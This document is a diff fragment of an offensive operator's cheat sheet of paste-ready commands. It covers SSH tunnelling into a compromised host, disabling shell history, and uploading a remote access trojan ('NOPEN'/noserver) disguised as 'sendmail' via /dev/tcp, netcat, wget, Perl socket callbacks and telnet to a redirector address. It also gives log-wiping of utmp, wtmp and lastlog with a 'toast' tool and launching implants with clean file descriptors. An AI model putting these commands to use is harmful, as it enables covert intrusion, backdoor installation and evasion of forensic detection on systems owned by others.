+ssh -R REMOTEONE:127.0.0.1:LOCALONE -x -v -p MASQTUNNEL_PORT MASQUSER@127.0.0.1 /bin/sh
+ssh -L LOCALTWO:127.0.0.1:REMOTETWO -x -v -p MASQTUNNEL_PORT MASQUSER@127.0.0.1 /bin/sh
+
+#OR, combined:
+ssh -R REMOTEONE:127.0.0.1:LOCALONE -L LOCALTWO:127.0.0.1:REMOTETWO -x -v -p MASQTUNNEL_PORT MASQUSER@127.0.0.1 /bin/sh
+
+
+unset HISTFILE
+unset HISTFILESIZE
+unset HISTSIZE
+w
+id
+uname -a
+ps -ef
+ls -lart /tmp
+mkdir /tmp/.scsi;cd /tmp/.scsi;pwd
+which cat
+
+/bin/cat < /dev/tcp/127.0.0.1/REMOTEONE > /tmp/.scsi/TUNRATNAME
+
+# Execute noserver to listen for connection through the SSH tunnel
+chmod 700 TUNRATNAME
+PATH=. D=-lREMOTETWO TUNRATNAME
+
+# LOCALLY:
+noclient 127.0.0.1:LOCALTWO
+
+### NOTE: With this technique you will have to rename
+### target data from NOPEN-HOSTNAME.127.0.0.1 to
+### NOPEN-HOSTNAME.TARGET-IP
+
+
+### END MASQ ###
+
+
+
+#######################
+# RAT UPLOAD METHODS  #
+#######################
+
+----------------------------------------
+
+# vi pastables
+# RATPAYLOAD - NOPEN filename (without /current/up/morerats)
+# RATIP - Redirector IP
+# RATPORT - Redirector PORT
+# RATNAME - Filename to call NOPEN (normally sendmail)
+
+:%s/UPWORKDIR//g
+:%s/RATPAYLOAD//g
+:%s/RATIP//g
+:%s/RATPORT//g
+:%s/RATNAME//g
+:%s/NOPENOPTS//g
+:%s/UPTARGET_IP//g
+
+# Defaults (sendmail/noserver/noserver-linux)
+:%s/UPWORKDIR/.scsi/g
+:%s/RATNAME/sendmail/g
+:%s/NOPENOPTS/-l32754/g
+:%s/RATPAYLOAD/noserver-sparc/g
+:%s/RATPAYLOAD/noserver-linux/g
+----------------------------------------
+
+# SHELL
+unset HISTFILE
+unset HISTSIZE
+unset HISTFILESIZE
+date; date -u
+w; id; pwd
+mkdir /tmp/UPWORKDIR; cd /tmp/UPWORKDIR; pwd
+----------------------------------------
+
+# Determine available upload methods
+# Solaris
+type wget nc
+type uudecode uncompress
+type ksh bash telnet
+type perl
+
+# Linux (which tends to work better than type)
+which wget nc
+which uudecode uncompress
+which ksh bash telnet
+which perl
+----------------------------------------
+
+# NOPEN -upload (automated netcat listener and redirect)
+Local:
+cd /current/up
+cp /current/up/RATPAYLOAD RATNAME
+# compress RATNAME
+# uuencode RATNAME.Z RATNAME.Z > RATNAME.Z.uu
+
+Redirector (RATIP):
+-upload /current/up/RATNAME RATPORT
+# -upload /current/up/RATNAME.Z.uu RATPORT
+----------------------------------------
+
+# /dev/tcp (-upload compatible)
+Local:
+nc -l -v -p RATPORT < /current/up/RATPAYLOAD
+(Probably will have to Ctrl-C once upload is finished)
+
+Redirector (RATIP):
+-tunnel
+r RATPORT
+
+Target (linux - bash shell):
+bash -c 'cat < /dev/tcp/RATIP/RATPORT > RATNAME'; ls -latr
+chmod 700 RATNAME
+PATH=. D=NOPENOPTS RATNAME
+
+Target (solaris - ksh shell):
+ksh -c 'cat < /dev/tcp/RATIP/RATPORT > RATNAME'; ls -latr
+chmod 700 RATNAME
+PATH=. D=NOPENOPTS RATNAME
+----------------------------------------
+
+# netcat (-upload compatible)
+Local:
+nc -l -v -p RATPORT < /current/up/RATPAYLOAD
+(Probably will have to Ctrl-C once upload is finished)
+
+Redirector (RATIP):
+-tunnel
+r RATPORT
+
+Target:
+nc RATIP RATPORT > RATNAME; ls -latr
+chmod 700 RATNAME
+PATH=. D=NOPENOPTS RATNAME
+----------------------------------------
+
+# wget
+Local:
+cd /current/up
+echo -e 'HTTP/1.0 200\n' > RATNAME
+cat /current/up/RATPAYLOAD >> RATNAME
+nc -l -v -p RATPORT < RATNAME
+
+Local (Packrat style):
+packrat -w RATNAME /current/up/RATPAYLOAD RATPORT
+
+Redirector (RATIP):
+-tunnel
+r RATPORT
+
+Target:
+wget http://RATIP:RATPORT/RATNAME; ls -latr
+chmod 700 RATNAME
+PATH=. D=NOPENOPTS RATNAME
+----------------------------------------
+
+# uudecode.pastable
+Local:
+uudecode.pastable -s /current/up/RATPAYLOAD RATNAME
+
+Target:
+# Paste the blue from uudecode.pastable
+PATH=. D=NOPENOPTS RATNAME
+----------------------------------------
+
+# uudecode
+Local:
+cd /current/up
+cp /current/up/RATPAYLOAD RATNAME
+compress RATNAME
+uuencode RATNAME.Z RATNAME.Z > RATNAME.Z.uu
+
+Remote:
+# gedit RATNAME.Z.uu
+# -- paste contents of gedit 
+uudecode; ls -latr
+uncompress RATNAME.Z
+ls -la
+chmod 700 RATNAME
+PATH=. D=NOPENOPTS RATNAME
+----------------------------------------
+
+# Perl Callback (-upload compatible)
+Local:
+nc -l -v -p RATPORT < /current/up/RATPAYLOAD
+
+Redirector:
+-tunnel
+r RATPORT
+
+Remote:
+perl -MIO -e 'close(STDIN);$c=IO::Socket::INET->new("RATIP:RATPORT")or exit1;binmode($c);open(O,">RATNAME")or exit 1;binmode(O);select O;$|=1; print O while (<$c>);close(STDOUT);close($c);unlink("RATNAME") unless (-s "RATNAME");'
+----------------------------------------
+
+# Perl Listen
+Remote:
+perl -MIO -e '$s=new IO::Socket::INET(LocalPort,RATPORT,Reuse,1,Listen,10) or exit 1; $c=$s->accept() or exit 1;open(O,">RATNAME")or exit 1;select O;$|=1;print O while <$c>;close(O);close($c);unlink("RATNAME") unless (-s "RATNAME");'
+
+Redirector:
+-tunnel
+l RATPORT UPTARGET_IP
+
+Local:
+nc -vv 127.0.0.1 RATPORT < /current/up/RATPAYLOAD
+----------------------------------------
+
+# telnet (-upload compatible)
+Local:
+cd /current/up
+cp /current/up/RATPAYLOAD RATNAME
+compress RATNAME
+uuencode RATNAME.Z RATNAME.Z > RATNAME.Z.uu
+nc -l -v -p RATPORT < /current/up/RATNAME.Z.uu
+
+Redirector:
+-tunnel
+r RATPORT
+
+Remote:
+telnet RATIP RATPORT < /dev/console | uudecode && uncompress RATNAME.Z && chmod 700 RATNAME && ls -latr
+PATH=. D=NOPENOPTS RATNAME
+----------------------------------------
+
+
+
+### END RAT ###
+
+
+
+#######################
+#      CLEANING       #
+#######################
+
+### TOAST ###
+
+### Target window
+-put /current/up/toast t
+
+### TO VIEW...
+./t -u /var/adm/utmp 
+./t -u /var/adm/wtmp | tail -20
+./t -x /var/adm/utmpx 
+./t -x /var/adm/wtmpx | tail -20
+./t -l /var/adm/lastlog | tail
+
+### TO ZAP...
+./t -u /var/adm/utmp tty date
+./t -u /var/adm/wtmp tty date
+./t -x /var/adm/utmpx tty date
+./t -x /var/adm/wtmpx tty date
+./t -l /var/adm/lastlog /var/adm/wtmpx user
+
+### Remove toast...
+-rm t
+
+### LOW-CARB DIET?  (NO TOAST AVAILABLE?) LOCALLY EDIT WITH khexedit OR vi in hex mode:
+:%!xxd
+
+
+
+#####################
+#      -shell       #
+#####################
+##################################################################
+## Using NOPEN to start something with clean file descriptors
+## using -shell then exec to close file descriptors.
+##
+## Two examples, one for noserver, one for other standalones.
+##################################################################
+
+
+# This can be useful after exploits, too--if our NOPEN inherits a
+# legit port from the exploit (say 161), then we install, we have just
+# hidden our target's snmpd. Not good.
+
+-shell
+unset HISTFILE
+unset HISTFILESIZE
+unset HISTSIZE
+exec 3<&- 4<&- 5<&- 6<&- 7<&- 8<&- 9<&-
+# We want only 0 1 and 2 left, ideally
+ls -al /proc/$$/fd
+# Try cleaning any over 9, but you often lose your -shell when you do so.
+# Look for a window you have with just fd's under 10.
+cp /proc/$$/exe sendmail || cp /proc/$$/object/a.out sendmail
+PATH=. D=-ulrandom14444-55555 sendmail
+# OR: PATH=. D=-ucREDIR_IP:random14444-55555 sendmail
+netstat -antp | grep sendmail || netstat -an | grep sendmail
+ps -ef | grep sendmail$
+rm sendmail
+exit
+
+# Used when deploying standalones (DD, SBZ), it helps avoid their
+# children having the NOPEN ports inherited in CLOSE_WAIT state.
+
+-put /current/up/STANDALONETODEPLOY  ./RAN_AS
+-addpath . 
+-shell
+unset HISTFILE
+unset HISTFILESIZE
+unset HISTSIZE
+exec 3<&- 4<&- 5<&- 6<&- 7<&- 8<&- 9<&-
+# We want only 0 1 and 2 left, ideally
+ls -al /proc/$$/fd
+# Try cleaning any over 9, but you often lose your -shell when you do so.
+# Look for a window you have with just fd's under 10.
+which RAN_AS
+RAN_AS FAKE_ARGS_IF_ANY &
+echo $? 
+rm RAN_AS
+exit
+
